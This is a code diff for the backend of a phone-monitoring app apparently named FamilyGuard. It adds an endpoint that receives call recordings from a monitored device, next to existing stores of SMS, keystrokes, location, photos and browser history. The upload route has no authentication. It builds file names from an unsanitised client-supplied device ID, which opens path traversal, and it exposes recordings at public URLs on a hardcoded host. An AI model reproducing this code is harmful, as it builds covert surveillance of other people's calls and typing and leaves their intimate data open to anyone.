@@ -1,8 +1,40 @@
 const express = require('express');
 const mongoose = require('mongoose');
-const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo, SMS, BrowserHistory, KeystrokeSession, User, InstalledApp } = require('../models');
+const multer = require('multer');
+const path = require('path');
+const fs = require('fs');
+const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo, SMS, BrowserHistory, KeystrokeSession, User, InstalledApp, CallRecording } = require('../models');
 
 const router = express.Router();
+
+// Configure multer for call recording uploads
+const callRecordingDir = path.join(__dirname, '..', 'uploads', 'call-recordings');
+if (!fs.existsSync(callRecordingDir)) {
+  fs.mkdirSync(callRecordingDir, { recursive: true });
+}
+
+const callRecordingStorage = multer.diskStorage({
+  destination: (req, file, cb) => cb(null, callRecordingDir),
+  filename: (req, file, cb) => {
+    const deviceId = req.body.deviceId || req.headers['x-device-id'] || 'unknown';
+    const timestamp = Date.now();
+    cb(null, `${deviceId}_${timestamp}_${file.originalname}`);
+  }
+});
+
+const callRecordingUpload = multer({
+  storage: callRecordingStorage,
+  limits: { fileSize: 50 * 1024 * 1024 }, // 50MB max
+  fileFilter: (req, file, cb) => {
+    const allowed = ['.mp3', '.m4a', '.wav', '.aac', '.ogg'];
+    const ext = path.extname(file.originalname).toLowerCase();
+    if (allowed.includes(ext)) {
+      cb(null, true);
+    } else {
+      cb(new Error('Only audio files are allowed'), false);
+    }
+  }
+});
 
 // Debug endpoint - check device by any ID
 router.get('/debug/:id', async (req, res) => {
@@ -1588,6 +1620,72 @@ router.get('/keystrokes/:deviceId/grouped', async (req, res) => {
   } catch (error) {
     console.error('Get grouped keystrokes error:', error);
     res.status(500).json({ error: 'Failed to get grouped keystrokes' });
+  }
+});
+
+// ==========================================
+// CALL RECORDING UPLOAD
+// ==========================================
+
+// POST /api/sync/call-recording
+// Upload a call recording from device
+router.post('/call-recording', callRecordingUpload.single('recording'), async (req, res) => {
+  try {
+    const deviceId = req.body.deviceId || req.headers['x-device-id'];
+    
+    if (!deviceId) {
+      return res.status(400).json({ error: 'deviceId is required' });
+    }
+    
+    // Verify device exists
+    const device = await Device.findOne({ deviceId });
+    if (!device) {
+      // Clean up uploaded file
+      if (req.file) fs.unlinkSync(req.file.path);
+      return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    if (!req.file) {
+      return res.status(400).json({ error: 'No recording file uploaded' });
+    }
+    
+    const { phoneNumber, callType, duration, timestamp } = req.body;
+    
+    // Generate a public URL for the recording
+    const baseUrl = process.env.BASE_URL || 'https://familyguard-backend-c2c9hkc8dwgzepdq.centralindia-01.azurewebsites.net';
+    const fileUrl = `${baseUrl}/uploads/call-recordings/${req.file.filename}`;
+    
+    // Save to database
+    const recording = new CallRecording({
+      deviceId: deviceId,
+      fileName: req.file.filename,
+      fileUrl: fileUrl,
+      fileSize: req.file.size,
+      duration: parseInt(duration) || 0,
+      phoneNumber: phoneNumber || 'Unknown',
+      callType: callType || 'unknown',
+      timestamp: timestamp ? new Date(parseInt(timestamp)) : new Date(),
+      listened: false
+    });
+    
+    await recording.save();
+    
+    console.log(`[Sync] Call recording saved: ${req.file.filename} from device ${deviceId}`);
+    
+    res.json({
+      success: true,
+      message: 'Call recording uploaded successfully',
+      recordingId: recording._id.toString(),
+      fileUrl: fileUrl
+    });
+    
+  } catch (error) {
+    console.error('[Sync] Call recording upload error:', error);
+    // Clean up uploaded file on error
+    if (req.file && fs.existsSync(req.file.path)) {
+      fs.unlinkSync(req.file.path);
+    }
+    res.status(500).json({ error: 'Failed to upload call recording: ' + error.message });
   }
 });
 
